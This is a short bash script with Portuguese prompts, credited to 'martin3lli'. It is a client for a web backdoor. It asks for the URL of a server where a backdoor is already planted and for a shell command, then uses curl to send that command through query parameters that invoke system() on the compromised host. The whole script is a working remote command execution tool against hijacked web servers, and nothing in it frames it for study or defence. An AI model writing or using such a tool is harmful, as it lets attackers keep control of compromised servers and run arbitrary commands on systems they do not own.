#!/bin/bash
# by martin3lli

echo "Script by martin3lli"
echo "@0xdwn"
echo "URL: "
read inputado

if [ "$inputado" == "" ]
then
echo "Informe a URL com o backdoor."
else
echo ""
echo "cmd: "
read info
echo ""
echo "Comando '$info'..."
curl "$inputado?0=system&V1=$info"
echo ""
fi
